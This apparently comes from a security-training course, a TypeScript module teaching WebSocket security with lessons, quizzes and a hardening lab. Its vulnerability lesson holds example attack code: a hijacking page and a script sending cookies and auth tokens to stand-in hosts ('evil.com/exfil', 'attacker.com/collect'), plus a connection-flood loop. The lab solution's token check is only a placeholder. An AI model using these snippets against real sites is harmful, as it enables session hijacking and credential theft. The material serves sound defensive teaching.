import type { Module } from '../../types';

export const websocketSecurity: Module = {
    id: 'websocket-security',
    title: 'WebSocket Security',
    description: 'Master the unique attack surface of WebSocket connections and learn to defend persistent bidirectional channels against hijacking, injection, and abuse.',
    difficulty: 'Advanced',
    xpReward: 400,
    locked: false,
    lessons: [
        {
            id: 'ws-theory-fundamentals',
            title: 'WebSocket Fundamentals & Attack Surface',
            type: 'theory',
            content: `
# WebSocket Fundamentals & Attack Surface

WebSockets provide full-duplex, persistent connections between client and server. This fundamentally changes the security model compared to traditional HTTP request-response.

## The WebSocket Handshake

A WebSocket connection starts as an HTTP request that gets **upgraded**:

\`\`\`
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://example.com
Cookie: session=abc123
\`\`\`

The server responds:

\`\`\`
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
\`\`\`

After this handshake, the connection switches from HTTP to the WebSocket protocol. **The HTTP security model no longer applies.**

## What Makes WebSockets Different

### No CORS Enforcement
HTTP requests are subject to CORS — browsers block cross-origin requests unless the server explicitly allows them. WebSocket connections have **no CORS**. Any website can open a WebSocket to any server:

\`\`\`javascript
// Any page on any domain can do this:
const ws = new WebSocket("wss://your-internal-api.com/ws");
// The browser sends cookies automatically
// There's no CORS preflight to block it
\`\`\`

### No Same-Origin Policy for WS
The browser's same-origin policy restricts HTTP, but WebSocket connections are exempt. A malicious page can connect to your WebSocket server and the browser will happily send along any cookies for that domain.

### Persistent Connection
HTTP is stateless — each request is independent. WebSocket connections persist for minutes, hours, or days. An attacker who compromises a connection has ongoing access, not just a single request.

### Bidirectional
The server can push data to the client without being asked. This means data exfiltration paths that don't exist with HTTP — a compromised connection can silently stream data to the attacker.

## The Attack Surface

\`\`\`
┌──────────────┐
│  Handshake   │  ← Origin validation, auth token, upgrade check
├──────────────┤
│  Connection  │  ← Rate limiting, connection limits, auth state
├──────────────┤
│  Messages    │  ← Input validation, size limits, injection
├──────────────┤
│  Lifecycle   │  ← Heartbeat, timeout, reconnection
└──────────────┘
\`\`\`

Each layer has distinct vulnerabilities that HTTP security controls don't cover.
            `
        },
        {
            id: 'ws-quiz-vs-http',
            title: 'WebSocket vs HTTP Security',
            type: 'quiz',
            content: '',
            quiz: {
                question: "A web application serves its API over HTTP with proper CORS headers that only allow requests from `app.example.com`. The team adds a WebSocket endpoint at `wss://api.example.com/ws`. Without additional protections, what is true about this WebSocket endpoint?",
                options: [
                    "The CORS headers automatically apply to WebSocket connections too, so only app.example.com can connect",
                    "The browser will enforce the same-origin policy and block cross-origin WebSocket connections",
                    "Any website can open a WebSocket connection to this endpoint because CORS does not apply to WebSocket handshakes",
                    "WebSocket connections are inherently more secure than HTTP because they use the Upgrade header"
                ],
                correctAnswer: 2,
                explanation: "CORS is an HTTP-only mechanism. The browser does not perform a CORS preflight for WebSocket connections. Any page on any origin can open a WebSocket to your server, and the browser will include cookies for your domain. The server must explicitly validate the Origin header during the handshake."
            }
        },
        {
            id: 'ws-theory-vulnerabilities',
            title: 'WebSocket Vulnerabilities',
            type: 'theory',
            content: `
# WebSocket Vulnerabilities

## Cross-Site WebSocket Hijacking (CSWSH)

The most critical WebSocket-specific vulnerability. It's the WebSocket equivalent of CSRF:

\`\`\`html
<!-- Attacker's page at evil.com -->
<script>
  // Browser sends victim's cookies for target domain automatically
  const ws = new WebSocket("wss://bank.example.com/ws");

  ws.onopen = () => {
    // Attacker can send commands AS the authenticated victim
    ws.send(JSON.stringify({
      action: "transfer",
      amount: 10000,
      to: "attacker-account"
    }));
  };

  ws.onmessage = (event) => {
    // Attacker receives all data meant for the victim
    fetch("https://evil.com/exfil", {
      method: "POST",
      body: event.data
    });
  };
</script>
\`\`\`

The browser includes cookies in the handshake. If the server only checks cookies for auth (no origin validation), the attacker has a fully authenticated WebSocket session.

## Message Injection

WebSocket messages are raw — no built-in content type, no automatic encoding:

\`\`\`javascript
// Server broadcasts messages to all clients
ws.on('message', (data) => {
  const msg = JSON.parse(data);
  // Vulnerable: broadcasts raw user input
  broadcast(JSON.stringify({
    user: msg.user,
    text: msg.text  // Could contain <script> tags or SQL
  }));
});
\`\`\`

If the client renders this directly into the DOM, it's XSS. If the server uses it in a database query, it's SQL injection. The transport changes; the injection principles don't.

## Authorization Bypass

A common pattern: check auth on handshake, then trust all subsequent messages:

\`\`\`javascript
// Server checks token only during connection
wss.on('connection', (ws, req) => {
  const token = parseToken(req.headers.cookie);
  if (!isValidToken(token)) {
    ws.close();
    return;
  }
  // BUG: No further auth checks on messages
  ws.on('message', (data) => {
    const action = JSON.parse(data);
    executeAction(action); // Trusts all messages from "authenticated" connection
  });
});
\`\`\`

Problems:
- Token may expire during a long-lived connection
- User's permissions may change after connection is established
- Shared connections (connection pooling) may serve multiple users

## Denial of Service via Connection Flooding

WebSocket connections are persistent and consume server memory:

\`\`\`javascript
// Attacker opens thousands of connections
for (let i = 0; i < 10000; i++) {
  new WebSocket("wss://target.com/ws");
}
\`\`\`

Each connection holds server resources. Without rate limiting, a single client can exhaust the server's connection pool.

## Data Exfiltration via WebSocket

WebSockets bypass many network monitoring tools that only inspect HTTP:

\`\`\`javascript
// Malicious client-side code exfiltrates data over WS
const exfil = new WebSocket("wss://attacker.com/collect");
exfil.onopen = () => {
  exfil.send(document.cookie);
  exfil.send(localStorage.getItem("authToken"));
  exfil.send(document.querySelector(".sensitive-data").textContent);
};
\`\`\`

Many WAFs and DLP tools don't inspect WebSocket frames, making this a blind spot.
            `
        },
        {
            id: 'ws-quiz-attacks',
            title: 'Attack Identification',
            type: 'quiz',
            content: '',
            quiz: {
                question: "A user visits `evil.com`, which contains JavaScript that opens `new WebSocket('wss://chat.example.com/ws')`. The browser automatically includes the user's session cookie for `chat.example.com`. The WebSocket server authenticates using only this cookie and does not check the Origin header. What type of attack is this?",
                options: [
                    "Cross-Site Scripting (XSS) — the attacker is injecting scripts into the target site",
                    "Cross-Site WebSocket Hijacking (CSWSH) — the attacker leverages the victim's authenticated session from a different origin",
                    "Man-in-the-Middle (MITM) — the attacker is intercepting traffic between client and server",
                    "Server-Side Request Forgery (SSRF) — the attacker is making the server connect to internal resources"
                ],
                correctAnswer: 1,
                explanation: "This is Cross-Site WebSocket Hijacking (CSWSH). The attacker's page initiates a WebSocket connection to the target server, and the browser automatically includes the victim's cookies. Without Origin header validation, the server cannot distinguish this from a legitimate connection. The attacker can then send commands and receive data as the authenticated user."
            }
        },
        {
            id: 'ws-theory-defense',
            title: 'Securing WebSockets',
            type: 'theory',
            content: `
# Securing WebSockets

WebSocket security requires defense at every layer: handshake, connection, message, and transport.

## 1. Origin Validation on Upgrade

The \`Origin\` header in the handshake request tells you which page initiated the connection. **Always validate it:**

\`\`\`javascript
const ALLOWED_ORIGINS = [
  'https://app.example.com',
  'https://admin.example.com',
];

wss.on('connection', (ws, req) => {
  const origin = req.headers.origin;
  if (!ALLOWED_ORIGINS.includes(origin)) {
    ws.close(4001, 'Origin not allowed');
    return;
  }
  // proceed with connection
});
\`\`\`

**Warning:** The Origin header can be spoofed by non-browser clients. Use it as defense-in-depth, not your only auth mechanism.

## 2. Per-Message Authentication

Don't rely solely on handshake authentication. Validate tokens with each message or periodically:

\`\`\`javascript
ws.on('message', (data) => {
  const message = JSON.parse(data);

  // Verify token with every message
  if (!isValidToken(message.token)) {
    ws.close(4002, 'Invalid or expired token');
    return;
  }

  // Check permissions for the specific action
  if (!hasPermission(message.token, message.action)) {
    ws.send(JSON.stringify({ error: 'Forbidden' }));
    return;
  }

  handleAction(message);
});
\`\`\`

## 3. Rate Limiting

Limit both connections and messages per client:

\`\`\`javascript
const connectionCounts = new Map();
const messageCounts = new Map();
const MAX_CONNECTIONS_PER_IP = 10;
const MAX_MESSAGES_PER_SECOND = 20;

wss.on('connection', (ws, req) => {
  const ip = req.socket.remoteAddress;
  const current = connectionCounts.get(ip) || 0;

  if (current >= MAX_CONNECTIONS_PER_IP) {
    ws.close(4003, 'Too many connections');
    return;
  }
  connectionCounts.set(ip, current + 1);

  ws.on('message', () => {
    const count = messageCounts.get(ip) || 0;
    if (count >= MAX_MESSAGES_PER_SECOND) {
      ws.send(JSON.stringify({ error: 'Rate limited' }));
      return;
    }
    messageCounts.set(ip, count + 1);
  });

  ws.on('close', () => {
    connectionCounts.set(ip, (connectionCounts.get(ip) || 1) - 1);
  });
});
\`\`\`

## 4. Message Size Limits

Prevent memory exhaustion from oversized messages:

\`\`\`javascript
const wss = new WebSocketServer({
  maxPayload: 64 * 1024, // 64 KB max message size
});
\`\`\`

## 5. Input Validation on Messages

Validate and sanitize every message. Never trust client input:

\`\`\`javascript
const Joi = require('joi');

const messageSchema = Joi.object({
  action: Joi.string().valid('chat', 'typing', 'read').required(),
  payload: Joi.string().max(1000).required(),
  token: Joi.string().required(),
});

ws.on('message', (raw) => {
  const { error, value } = messageSchema.validate(JSON.parse(raw));
  if (error) {
    ws.send(JSON.stringify({ error: 'Invalid message format' }));
    return;
  }
  handleValidatedMessage(value);
});
\`\`\`

## 6. WSS (TLS)

Always use \`wss://\` in production, never \`ws://\`:
- Prevents MITM interception of WebSocket frames
- Required for cookies with \`Secure\` flag
- Most browsers block mixed content (ws:// from https:// page)

## 7. Heartbeat & Timeout Management

Detect and clean up dead connections:

\`\`\`javascript
const HEARTBEAT_INTERVAL = 30000; // 30 seconds
const HEARTBEAT_TIMEOUT = 10000;  // 10 seconds to respond

wss.on('connection', (ws) => {
  ws.isAlive = true;
  ws.on('pong', () => { ws.isAlive = true; });
});

setInterval(() => {
  wss.clients.forEach((ws) => {
    if (!ws.isAlive) {
      ws.terminate(); // Dead connection — clean up
      return;
    }
    ws.isAlive = false;
    ws.ping();
  });
}, HEARTBEAT_INTERVAL);
\`\`\`
            `
        },
        {
            id: 'ws-lab',
            title: 'Secure the WebSocket Server',
            type: 'lab',
            content: 'The WebSocket server handler below has no security controls. Your mission: add origin validation, token authentication, rate limiting, and message validation to lock it down.',
            lab: {
                initialCode: `
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws, req) => {
  console.log('New connection');

  ws.on('message', (data) => {
    const message = JSON.parse(data);

    // Broadcast to all clients
    wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify({
          user: message.user,
          text: message.text,
          timestamp: Date.now(),
        }));
      }
    });
  });
});
                `,
                solutionCode: `
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080, maxPayload: 64 * 1024 });

const ALLOWED_ORIGINS = ['https://app.example.com'];
const rateLimitMap = new Map();
const MAX_MESSAGES_PER_SECOND = 10;

function isValidToken(token) {
  // Verify JWT or session token
  return typeof token === 'string' && token.length > 0;
}

wss.on('connection', (ws, req) => {
  // 1. Origin validation
  const origin = req.headers.origin;
  if (!ALLOWED_ORIGINS.includes(origin)) {
    ws.close(4001, 'Origin not allowed');
    return;
  }

  const ip = req.socket.remoteAddress;
  console.log('New connection from allowed origin');

  ws.on('message', (data) => {
    // 2. Rate limiting
    const now = Date.now();
    const timestamps = rateLimitMap.get(ip) || [];
    const recent = timestamps.filter((t) => now - t < 1000);
    if (recent.length >= MAX_MESSAGES_PER_SECOND) {
      ws.send(JSON.stringify({ error: 'Rate limited' }));
      return;
    }
    recent.push(now);
    rateLimitMap.set(ip, recent);

    const message = JSON.parse(data);

    // 3. Token validation
    if (!isValidToken(message.token)) {
      ws.close(4002, 'Invalid token');
      return;
    }

    // 4. Message validation
    if (typeof message.text !== 'string' || message.text.length > 500) {
      ws.send(JSON.stringify({ error: 'Invalid message' }));
      return;
    }

    const sanitizedText = message.text
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;');

    wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify({
          user: message.user,
          text: sanitizedText,
          timestamp: Date.now(),
        }));
      }
    });
  });
});
                `,
                instructions: "Secure the WebSocket server: 1) Add ALLOWED_ORIGINS array and validate req.headers.origin on connection — close with code 4001 if not allowed, 2) Add a rateLimitMap and MAX_MESSAGES_PER_SECOND — reject messages exceeding the limit, 3) Add isValidToken function and validate message.token — close with code 4002 if invalid, 4) Validate message.text is a string with max length 500, 5) Sanitize text by replacing < and > with HTML entities before broadcasting, 6) Set maxPayload on the WebSocket.Server options."
            }
        }
    ]
};
